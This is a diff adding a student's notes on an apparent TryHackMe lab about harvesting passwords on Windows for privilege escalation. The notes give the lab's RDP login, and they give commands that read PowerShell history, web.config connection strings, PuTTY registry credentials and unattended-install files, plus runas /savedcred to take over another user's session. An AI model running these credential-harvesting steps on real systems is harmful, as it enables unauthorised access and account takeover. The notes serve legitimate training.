@@ -1,0 +1,77 @@
+TASK_3
+Windows Privilege Escalation > Task 5 "Passwd Harvesting" // Methods: >powershell >saved_win_creds >software_related_creds >unattended_installation
+
+
+_______rdp creds_______
+|Username: thm-priv   |
+|Password: Password321|
+-----------------------
+
+
+The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.
+
+(connect via rdp)
+Q1. PowerShell History
+    Open cmd and run
+        input   :   type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+        outpt   :   ...
+                    cmdkey /add:thmdc.local /user:julia.jones /pass:<PASSWD>
+                    ...
+
+Q2. IIS Configuration
+    IIS//Internet Information Services  :   the default web server on windows installations
+    web.configuration                   :   configuration file of websites that can store passwords for databases or configured authentication mechanisms
+    Open cmd and run the following commands to search the config file
+        input   :   type C:\inetpub\wwwroot\web.config | findstr connectionString
+        outpt   :   The system cannot find the file specified.
+        Maybe its not here
+
+        Try
+        input   :   type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+        outpt   :   ...
+                    <connectionStrings>
+                        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=<PASSWD>"<> name="THM-DB" />
+                    </connectionStrings>
+
+Q3.  Saved Windows Credentials
+    List them
+        input   :   cmdkey /list
+        outpt   :   Target: Domain:interactive=WPRIVESC1\mike.katz
+                    Type: Domain Password
+                    User: WPRIVESC1\mike.katz
+    Interesting!
+
+    Lets connect with a shell to this user (mike.katz) via runas
+        input   :   runas /savedcred /user:mike.katz cmd.exe
+        outpt   :   Shell opens to a new window! Hit "whoami" to verify the user
+
+    Now head to finding the flag
+        input   :   type <PATH_TO_FLAG>.txt
+        outpt   :   <FLAG>
+
+Q4. Software Credential Retrieval (PuTTY)
+    PuTTY is an SSH client commonly found on Windows systems and stores the proxy configurations with cleartext authentication credentials
+        input   :   reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+        outpt   :       ...
+                        ProxyUsername    REG_SZ    thom.smith
+                        ProxyPassword    REG_SZ    <PASSWD>
+                        ...
+        Tip     :   Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.
+
+
+Honorable Mention
+
+Unattended Windows Installations
+    Unattnded Windows Installations :   At the installation progress on a vast number of machines that are intended for windows set up, admins may use Windows Deployment Service. This allows a single os image to be deployed to
+                                        several machines through the network
+    Look into the folloing paths for initial setup files:
+        - C:\Unattend.xml
+        - C:\Unattend.xml
+        - C:\Windows\Panther\Unattend.xml
+        - C:\Windows\Panther\Unattend\Unattend.xml
+        - C:\Windows\system32\sysprep.inf
+        - C:\Windows\system32\sysprep\sysprep.xml
+
+
+
+made by @gr1m.r3ap3r
